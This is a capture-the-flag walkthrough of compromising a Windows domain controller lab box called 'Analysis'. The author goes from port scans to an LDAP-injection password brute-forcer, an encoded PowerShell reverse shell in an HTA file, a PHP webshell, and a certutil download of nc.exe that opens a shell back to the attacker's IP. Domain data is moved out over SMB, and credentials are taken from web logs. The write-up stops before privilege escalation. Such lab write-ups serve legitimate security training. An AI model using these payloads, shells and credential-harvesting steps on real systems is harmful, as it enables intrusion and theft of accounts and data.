
## CTF Writeup: Analysis

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.230.179      
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-05 10:45 -0500
Nmap scan report for 10.129.230.179
Host is up (0.031s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-05 15:46:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3306/tcp  open  mysql         MySQL (unauthorized)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
33060/tcp open  mysqlx        MySQL X protocol listener
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-05T15:47:20
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 152.38 seconds
```

The target seems to be an Domain Controller. We gained information about the Hostname "DC-ANALYSIS", the domain itself "analysis.htb" and the FQDN "DC-ANALYSIS.analysis.htb". Let's map all of this information to the target ip address in our local dns file for recursive resolving.

```
echo "10.129.230.179 DC-ANALYSIS.analysis.htb analysis.htb DC-ANALYSIS" | tee -a /etc/hosts
```

Tried connecting to the MySQL Database since it's open, but it's working with an whitelist.

```
mysql -u root -p'' -h 10.129.230.179 -P 3306 --skip-ssl-verify-server-cert 
Enter password: 
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host '10.10.14.57' is not allowed to connect to this MySQL server
```

Tried spraying anonymous & guest access on all interesting protocols: ldap, smb & winrm. But nothing worked. 

```
nxc smb analysis.htb -u '' -p '' --shares
```

Proceeded with enumerating the http service running on port 80. Upon inspecting the homepage it reveals that it seems to be an homepage of an SOC Provider. The webpage seems to be very unfinished. There is only one tab which has an dropdown with "internal, "

Enumerated endpoints using "feroxbuster". The only non-default endpoint was an /bat endpoint but the issue is that we aren't authorized to access the endpoint.

```
feroxbuster --url http://analysis.htb
```

Utilized a different wordlist to enumerate potential endpoints.

```
feroxbuster -u http://analysis.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Proceeded with enumerating subdomains, utilizing "ffuf". I was able to enumerate an "internal" subdomain which is quite interesting. Although it prompted an 403 server response. But the issue is that we can't really access it.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://analysis.htb -H "Host: FUZZ.analysis.htb"
```

Mapped the subdomain to the target ip address.

```
mousepad /etc/hosts
internal.analysis.htb
```

Proceeded with enumeration of endpoints on the identified subdomain.

```
feroxbuster -u http://internal.analysis.htb
```

Our scan revealed three endpoints:

```
/dashboard
/employees
/users
```

All of those endpoints weren't accessible, so let's enumerate further endpoints.

Successfully enumerated an interesting /login.php endpoint using feroxbuster.

```
feroxbuster --url http://internal.analysis.htb/employees -w /usr/share/dirb/wordlists/common.txt -x txt,php,html,zip,json,docx,aspx,asp,cgi,pdf
```

The target seems to be an Internal Login Panel.

```
http://internal.analysis.htb/employees/login.php
```

Tested for ways to bypass auth, but wasn't possible. Since we don't have an username, trying to bruteforce the login panel shouldn't be the right way either. 

So I decided to enumerate the other endpoints /users & /dashboard to check if we can find smth interesting.

Enumerated file extensions on /users endpoint & identified another 200 server response on an /list.php endpoint.

```
feroxbuster --url http://internal.analysis.htb/users -w /usr/share/dirb/wordlists/common.txt -x txt,php,html,zip,json,docx,aspx,asp,cgi,pdf
```

Inspecting the endpoint in the browser provided us with "missing parameter" as information.

```
http://internal.analysis.htb/users/list.php
```

Let's intercept the network package in our web proxy in order to analyze which parameter seems to be missing. There wasn't a parameter inside, so I tried to add my own, but it didn't work. Let's try & enumerate which parameter is missing by using ffuf.

I was able to successfully enumerate the missing parameter "name".

```
ffuf -u http://internal.analysis.htb/users/list.php?FUZZ= -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 17
```

When inspecting the parameter inside browser it actually provided us with an table with attributes. The table is almost blank besides the "Username" parameter. There seems to be an default parameter inside

```
CONTACT_
```

We can check if LDAP Injection is possible or the Web Application is somehow authenticating against LDAP.

This actually revealed a new username called "technician". Which is quite interesting.

```
http://internal.analysis.htb/users/list.php?name=*
```

Since I don't have much knowledge about LDAP I had to research from here on now:

Had to utilize the following script in order to enumerate an password. Why? The initial thought was to run Burp's Intruder with an Sniper to slowly enumerate the next char until we got an hit for the "technician" user. But the problem with that is an LDAP Query breaks when there is two "*" signs inside. So when another * char is inside the password the Burp Intruder get's cancelled.

```
#!/usr/bin/env python3

import asyncio
import httpx
import sys
from dataclasses import dataclass
from string import printable
from urllib.parse import quote, unquote


@dataclass
class Result:
    value: str = ''

alphabet = [c for c in printable[:-5] if c not in '()']

async def test_str(client, str_to_check) -> bool|None:
    resp = await client.get(f'http://internal.analysis.htb/users/list.php?name={username})({field}={str_to_check}*')
    if "Search result" not in resp.text or "CONTACT_" in resp.text:
        return None
    resp2 = await client.get(f'http://internal.analysis.htb/users/list.php?name={username})({field}={str_to_check}')
    if "Search result" not in resp.text or "CONTACT_" in resp2.text:
        return False
    return True


async def worker(queue, result, client):
    while True:
        str_to_check = await queue.get()
        if str_to_check == quote("97N"):
            pass #breakpoint()
        if str_to_check is None:
            queue.task_done()
            break
        if not str_to_check.startswith(result.value):
            queue.task_done()
            continue
        exact_match = await test_str(client, str_to_check)
        if exact_match is not None:
            if len(str_to_check) > len(result.value) or len(str_to_check) == len(result.value) and result.value[-1] == quote('*'):
                print(f"\r{str_to_check}", end="")
                result.value = str_to_check
                if exact_match is False:
                    for l in alphabet:
                        queue.put_nowait(f'{str_to_check}{quote(l)}')

        queue.task_done()


async def main():
    async with httpx.AsyncClient() as client:
        queue = asyncio.Queue()
        temp_value = ''
        value = Result()
        print(f'[*] Brute-forcing {field} for {username}...')
        while True:
            for letter in alphabet:
                queue.put_nowait(f'{temp_value}{quote(letter)}')

            workers = [asyncio.create_task(worker(queue, value, client)) for _ in range(50)]

            await queue.join()

            for _ in workers:
                queue.put_nowait(None)

            await asyncio.gather(*workers)

            if temp_value == f'{value.value}*':
                break
            temp_value = value.value + '*'

        print(f"\r[+] {username}'s {field}: {value.value}")


if len(sys.argv) != 3:
    print(f"usage: {sys.argv[0]} <user> <field>")
    exit(1)

username = sys.argv[1]
field = sys.argv[2]
asyncio.run(main())
```

The idea of this script is to enumerate the "Description" Field inside LDAP of the technician user since this is often the spot for stored passwords of users.

Gave the python script executable permissions and slowly enumerated the password:

```
python3 ldap_injection.py technician description
[*] Brute-forcing description for technician...
[+] technician's description: 97NTtl*4QP96Bv
```

Gained credentials.

```
technician:97NTtl*4QP96Bv
```

Verified the credentials.

```
nxc smb analysis.htb -u technician -p '97NTtl*4QP96Bv'
```

Enumerated domain users.

```
nxc smb analysis.htb -u technician -p '97NTtl*4QP96Bv' --rid-brute > newusers.txt
```

Formatted the wordlist accordingly for future password spraying.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

There seems to be an svc_web service account active.

```
cat users.txt 
Administrateur
Invité
krbtgt
DC-ANALYSIS$
jdoe
soc_analyst
cwilliams
technician
webservice
wsmith
jangel
lzen
svc_web
amanson
badam
```

Tried enumerating domain information using bloodhound-python, but it didn't work.

```
bloodhound-python -u technician -p '97NTtl*4QP96Bv' -ns 10.129.230.179 -d analyis.htb -c all
```

Enumerated LDAP Information using "ldapsearch" and stored the output inside an ldapsearch.txt file on my local machine.

```
ldapsearch -H "ldap://10.129.230.179" -D technician@analysis.htb -w '97NTtl*4QP96Bv' -b "dc=analysis,dc=htb" "*" > ldapsearch.txt
```

Queried for description didn't provided us a new password.

```
cat ldapsearch.txt | grep description
```

Checked users for password re-use by spraying the users list and we were able to identify that user "cwilliams" is also using the same password as the technician user.

```
nxc smb analysis.htb -u users.txt -p passwords.txt --continue-on-success
```

```
cwilliams:97NTtl*4QP96Bv
```

But even with that user we don't have anything interesting to workaround.

We can't download bloodhound domain information, we can't connect to WinRM and we aren't able to connect.

```
nxc winrm analysis.htb -u cwilliams -p passwords.txt
```

Let's try to login into to internal login panel /login.php endpoint we identified previously!

Since the login field requires an E-Mail I logged into the Panel.

The Web Application seems to be an SOC Dashboard. Upon inspecting the tickets tab it was quite interesting, there were still 2 unresolved tickets of user "technician". One user is talking about trying to upload hta files and about an server response of "failed to execute" which could be a hint, that we'll be able to get RCE by uploading an malicious HTA file somewhere.

Let's enumerate the panel further.

In the /form.php endpoint there is an upload functionality.

```
http://internal.analysis.htb/dashboard/form.php
```

Created the following HTA / VBScript Reverse Shell and stored it inside an shell.hta on my local machine.

```
<!DOCTYPE html>
<html>
<body>
    <script type="text/vbscript">
        Dim shell
        Set shell = CreateObject("WScript.Shell")
        shell.Run "powershell -e cG93ZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjE0LjU3JywgODgpOyROZXR3b3JrU3RyZWFtID0gJFRDUENsaWVudC5HZXRTdHJlYW0oKTskU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pO2Z1bmN0aW9uIFdyaXRlVG9TdHJlYW0gKCRTdHJpbmcpIHtbYnl0ZVtdXSRzY3JpcHQ6QnVmZmVyID0gMC4uJFRDUENsaWVudC5SZWNlaXZlQnVmZmVyU2l6ZSB8ICUgezB9OyRTdHJlYW1Xcml0ZXIuV3JpdGUoJFN0cmluZyArICdTSEVMTD4gJyk7JFN0cmVhbVdyaXRlci5GbHVzaCgpfVdyaXRlVG9TdHJlYW0gJyc7d2hpbGUoKCRCeXRlc1JlYWQgPSAkTmV0d29ya1N0cmVhbS5SZWFkKCRCdWZmZXIsIDAsICRCdWZmZXIuTGVuZ3RoKSkgLWd0IDApIHskQ29tbWFuZCA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkQnl0ZXNSZWFkIC0gMSk7JE91dHB1dCA9IHRyeSB7SW52b2tlLUV4cHJlc3Npb24gJENvbW1hbmQgMj4mMSB8IE91dC1TdHJpbmd9IGNhdGNoIHskXyB8IE91dC1TdHJpbmd9V3JpdGVUb1N0cmVhbSAoJE91dHB1dCl9JFN0cmVhbVdyaXRlci5DbG9zZSgpIg==", 0, False
    </script>
</body>
</html>
```

Started up listener on port 443.

```
rlwrap nc -lvnp 443
```

Uploaded the file successfully. Tried to access it via browser to execute it, but when accessing it, it only downloaded it.

Since the target seems to be running .php, let's try & upload an webshell.php onto the target server.

```
<?php system($_REQUEST["cmd"]);?>
```

This worked! We now got command execution on the DC.

```
http://internal.analysis.htb/dashboard/uploads/webshell.php?cmd=whoami
```

Let's try & get RCE.

Started up python3 webserver in the directory in which my nc.exe is stored.

```
python3 -m http.server 80
```

Downloaded nc.exe onto C:\Windows\Tasks since I know it's writable.

```
http://internal.analysis.htb/dashboard/uploads/webshell.php?cmd=certutil%20-urlcache%20-split%20-f%20http://10.10.14.57/nc.exe%20C:\Windows\Tasks\nc.exe
```

Executed nc.exe to make an reverse connection to our local machine listener.

```
http://internal.analysis.htb/dashboard/uploads/webshell.php?cmd=C:\Windows\Tasks\nc.exe%2010.10.14.57%20443%20-e%20cmd.exe
```

Gained RCE as user svc_web.

```
rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.230.179] 49299
Microsoft Windows [version 10.0.17763.5328]
(c) 2018 Microsoft Corporation. Tous droits r�serv�s.

C:\inetpub\internal\dashboard\uploads>
```

Let's transfer SharpHound and winPEAS onto the target server.

```
certutil -urlcache -split -f http://10.10.14.57/winPEASx64.exe winPEAS.exe
```

```
certutil -urlcache -split -f http://10.10.14.57/SharpHound.exe SharpHound.exe
```

Executed SharpHound.exe to download domain information, it stored it inside an 20260905212050_BloodHound.zip. Let's download it onto our local machine.

Started up an smbserver on my local machine.

```
impacket-smbserver test . -smb2support -username saitama -password saitama
```

Performed an connection to my local smb share onto the target server and created an M:\ Drive for this endavour.

```
net use m: \\10.10.14.57\test /user:saitama saitama
```

Downloaded the .zip file / put it inside the SMB Share on my local machine.

```
copy 20260905212050_BloodHound.zip m:\
```

unzipped it.

```
unzip 20260905212050_BloodHound.zip
```

Started up my local BloodHound Instance.

```
bloodhound-start
```

Uploaded Domain Information and marked user "cwilliams" & "svc_web" as owned. But couldn't find any ACL open to escalate privs.

Found an interesting "private" directory inside the root file system, which held an interesting .txt file with an encoded message. Encoded with BCTextEncoder Utility v. 1.03.2.1

```
C:\private>type encoded.txt
type encoded.txt
-----BEGIN ENCODED MESSAGE-----
Version: BCTextEncoder Utility v. 1.03.2.1

wy4ECQMCq0jPQTxt+3BgTzQTBPQFbt5KnV7LgBq6vcKWtbdKAf59hbw0KGN9lBIK
0kcBSYXfHU2s7xsWA3pCtjthI0lge3SyLOMw9T81CPqT3HOIKkh3SVcO9jdrxfwu
pHnjX+5HyybuBwIQwGprgyWdGnyv3mfcQQ==
=a7bc
-----END ENCODED MESSAGE-----
```

Upon researching for BCTextEncoder Utility, we'll definitly need an password for this before trying to decode this. So this is maybe a thing we can comeback later to.

Let's check .log files of the webserver to maybe get an login entry.

This was quite promising since we gained new credentials for user "jdoe" in C:\inetpub\logs\LogFiles\W3SVC2\u_ncsa2.log

```
127.0.0.1 - - [05/Sep/2026:21:27:56 +0200] "GET /dashboard/alert_panel.php?auth=1&username=jdoe&password=7y4Z4%5E*y9Zzj&alert=c2_malware_detected HTTP/1.1" 200 8924
```

The password seems url encoded, let's decode it:

```
jdoe:7y4Z4^*y9Zzj
```

Verified if we can login into the DC using the new user and it works!

```
nxc winrm analysis.htb -u jdoe -p '7y4Z4^*y9Zzj'
```

Let's respray with the newly discovered credentials.

```
nxc winrm analysis.htb -u users.txt -p passwords.txt --continue-on-success
```

Marked user "jdoe" as owned in BloodHound.

Connected to the DC using evil-winrm.

```
evil-winrm -i analysis.htb -u jdoe -p '7y4Z4^*y9Zzj'
```

Retrieved user.txt in C:\Users\jdoe\Desktop.

```
db6289dbdf1f50b95a0f4a295efb7b13
```
## Privilege Escalation

Since I know what the next step will be, that we'll have to decode the encoded message, but after researching I realised that it's way to hard. We need to download the entire TextEncoder.exe file locally and reverse engineer and analyze the application to check api calls and perform an DLL Injection, which is out of my scope for now, will come back to this Lab.